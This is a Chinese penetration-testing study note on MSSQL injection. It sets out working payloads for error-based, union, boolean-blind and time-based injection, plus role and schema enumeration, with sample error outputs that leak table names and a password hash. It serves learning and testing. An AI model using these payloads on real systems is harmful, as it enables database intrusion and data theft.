---
title: "MSSQL 注入学习笔记"
date: 2019-05-17T12:46:13+08:00
draft: true
tags: ['mssql','sql']
categories: ['渗透测试']
---

跟着404师傅学[mssql注入](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)写的笔记

<!--more-->

## 自带库介绍

```
master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。

model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础

msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。

tempdb   //它为临时表和其他临时工作提供了一个存储区。
```

其中最主要的是`master`数据库，其中存储了所有的数据库名等，还有很多`存储过程`

> 存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。

![](https://y4er.com/img/uploads/20190517130435.png)

在master数据库中有`master.dbo.sysdatabases`视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有`syscolumns`存储着所有的字段，可编程性储存着我们的函数。

mssql的存储过程天然支持多语句，为我们的注入提供了遍历。

增删改查和MySQL数据库大同小异，具体可以自行w3c。

## 信息搜集

先来了解下mssql中有哪些角色/权限

> 以下摘自[官网文档](https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017)

| 服务器级的固定角色 | 描述                                                         |
| :----------------- | :----------------------------------------------------------- |
| sysadmin       | sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。    |
| serveradmin    | serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。 |
| securityadmin  | securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 `GRANT`、`DENY` 和 `REVOKE` 服务器级权限。 他们还可以 `GRANT`、`DENY` 和 `REVOKE` 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。  重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。 |
| processadmin   | processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。 |
| setupadmin     | setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。） |
| bulkadmin      | bulkadmin 固定服务器角色的成员可以运行 `BULK INSERT` 语句。  |
| diskadmin      | diskadmin 固定服务器角色用于管理磁盘文件。                   |
| dbcreator    | dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。 |
| puic       | 每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。  注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。 |

| 固定数据库角色名      | 描述                                                         |
| :-------------------- | :----------------------------------------------------------- |
| db_owner          | db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。） |
| db_securityadmin  | db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。 |
| db_accessadmin    | db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。 |
| db_backupoperator | db_backupoperator 固定数据库角色的成员可以备份数据库。   |
| db_ddladmin       | db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。 |
| db_datawriter     | db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。 |
| db_datareader     | db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。 |
| db_denydatawriter | db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。 |
| db_denydatareader | db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。 |

我们可以用`IS_SRVROLEMEMBER`来判断服务器级别的固定角色

| 返回值 | 描述                                                 |
| :----- | :--------------------------------------------------- |
| 0      | login 不是 role 的成员。                             |
| 1      | login 是 role 的成员。                               |
| NULL   | role 或 login 无效，或者没有查看角色成员身份的权限。 |

构造语句

```mssql
and 1=(select is_srvrolemember('sysadmin'))

and 1=(select is_srvrolemember('serveradmin'))

and 1=(select is_srvrolemember('setupadmin'))

and 1=(select is_srvrolemember('securityadmin'))

and 1=(select is_srvrolemember('diskadmin'))

and 1=(select is_srvrolemember('bulkadmin'))
```

数据库级别的应用角色用`IS_MEMBER`函数判断

```mssql
SELECT IS_MEMBER('db_owner')
```

再来看一些基本信息

```mssql
SELECT @@version; //版本
SELECT user;		//用户
SELECT DB_NAME();	//当前数据库名，你可以用db_name(n)来遍历出所有的数据库
SELECT @@servername;	//主机名
```

那么站库分离可以这么来判断

```mssql
select * from user where id='1'and host_name()=@@servername;--'
```

## 符号

注释符

```mssql
/* 
--
;%00
```

空白符号

```mssql
01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20	--暂时不了解为什么

/**/
```

运算

```mssql
--基本的不列举了，举几个特殊的
ALL 如果一组的比较都为true，则比较结果为true
AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false
ANY 如果一组的比较中任何一个为true，则结果为true
BETWEEN 如果操作数在某个范围之内，那么结果为true
EXISTS  如果子查询中包含了一些行，那么结果为true
IN  如果操作数等于表达式列表中的一个，那么结果为true
LIKE    如果操作数与某种模式相匹配，那么结果为true
NOT 对任何其他布尔运算符的结果值取反
OR  如果两个布尔表达式中的任何一个为true，那么结果为true
SOME    如果在一组比较中，有些比较为true，那么结果为true
```

## 基本注入流程

此处利用mssql数据类型不一样比较报错，爆出当前数据库名

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()>1;
```

```mssql
在将 nvarchar 值 'FanmvCMS' 转换成数据类型 int 时失败。
```

爆表名

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype='u');
```

```mssql
在将 nvarchar 值 'Fanmv_Admin' 转换成数据类型 int 时失败。
```

此处`xtype`可以是下列对象类型中的一种： 

| 缩写 | 全称                         |
| :--: | :--------------------------- |
|  C   | CHECK 约束                   |
|  D   | 默认值或 DEFAULT 约束        |
|  F   | FOREIGN KEY 约束             |
|  L   | 日志                         |
|  FN  | 标量函数                     |
|  IF  | 内嵌表函数                   |
|  P   | 存储过程                     |
|  PK  | PRIMARY KEY 约束（类型是 K） |
|  RF  | 复制筛选存储过程             |
|  S   | 系统表                       |
|  TF  | 表函数                       |
|  TR  | 触发器                       |
|  U   | 用户表                       |
|  UQ  | UNIQUE 约束（类型是 K）      |
|  V   | 视图                         |
|  X   | 扩展存储过程                 |

此处的`sysobjects`等同于` [master].[sys].[objects]`

爆列名

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'Fanmv_Admin'));
```

```mssql
在将 nvarchar 值 'AdminID' 转换成数据类型 int 时失败。
> [22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 'AdminID' 转换成数据类型 int 时失败。 (245)
```

爆数据

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin);
```

```mssql
在将 varchar 值 '81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6' 转换成数据类型 int 时失败。
```

当然，在mssql中也存在`INFORMATION_SCHEMA`，你也可以通过它来查询。

```mssql
select * from INFORMATION_SCHEMA.TABLES
select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin'
and 1=(select top 1 table_name from information_schema.tables);--
```

判断表名更方便的一种方式是使用`having 1=1`，`GROUP BY`

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1
```

```mssql
选择列表中的列 'Fanmv_Admin.AdminID' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
```

爆出一列，将其用group by 拼接进去继续往后爆其他的

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1
```

```mssql
选择列表中的列 'Fanmv_Admin.IsSystem' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
```

```mssql
SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1
```

```mssql
选择列表中的列 'Fanmv_Admin.AdminName' 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
```

以此爆出所有字段

## 报错注入

其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错

先来看隐式报错

```mssql
select * from admin where id =1 and (select user)>0
```

user和0进行比较时就会报错

再来看显示报错，一般上显示报错用到的是`cast`和`convert`函数

```mssql
select * from admin where id =1 (select CAST(USER as int))
select * from admin where id =1 (select convert(int,user))
```

这里再来引入一个`declare`

```mssql
select * from admin where id =1;declare @a varchar(2000) set @a='select convert(int,user)' exec(@a);
```

`declare`定义变量 `set`赋值`exec`执行

## 联合查询注入

mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位

```mssql
SELECT * from users where id=1 union select null,null,DB_NAME();
```

你也可以这样来联合报错

```mssql
SELECT * from users where id=1 union select null,null, (select CAST(db_name() as int))
```

## 布尔盲注

```mssql
SELECT * from users where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))=109
```

布尔盲注没有mssql那么多姿势，大同小异截取字符串比较

## 时间盲注

```mssql
SELECT * from users where id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'
```

`waitfor delay '0:0:5'`是mssql的延时语法

同样可以用字符串截取来延时注入

```mssql
select * from users where id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))>1 WAITFOR DELAY '0:0:5'
```

---

下一篇写拿shell和提权的。再次感谢404师傅。